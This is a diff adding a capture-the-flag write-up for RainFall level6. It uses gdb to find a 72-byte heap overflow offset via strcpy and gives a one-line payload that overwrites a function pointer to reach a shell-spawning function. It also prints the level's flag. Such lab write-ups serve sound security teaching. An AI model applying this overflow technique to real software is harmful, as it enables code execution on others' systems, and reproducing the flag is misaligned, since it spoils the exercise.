@@ -1,0 +1,27 @@
+# after analyzing with ghidra and gdb, there's a function pointer variable that points to function 'm'
+# which writes 'Nope' that's it. but there's another function 'n' that is not called, but it opens
+# a shell. We need to make this function run during program execution. but how?
+# There's also strcpy (which is vulnerable to buffer overflow), it's copying the input to a dest buffer (heap memory).
+# the function pointer memory is also heap memory that happens to be near the heap memory of the dest buffer.
+
+# let's try to get the offset to the function pointer's heap memory, by overflowing the buffer.
+
+(gdb) break *0x080484ca
+Breakpoint 1 at 0x80484ca
+(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS
+Starting program: /home/user/level6/level6 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS
+(gdb) print $esp + 0x18
+$2 = (void *) 0xbffff6d8
+(gdb) x/xw 0xbffff6d8
+0xbffff6d8:	0x0804a050
+(gdb) x/xw 0x0804a050
+0x804a050:	0x53535353
+level6@RainFall:~$ echo -n "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR" | wc -m
+72
+
+# so the offset is 72
+
+# Solution:
+
+level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
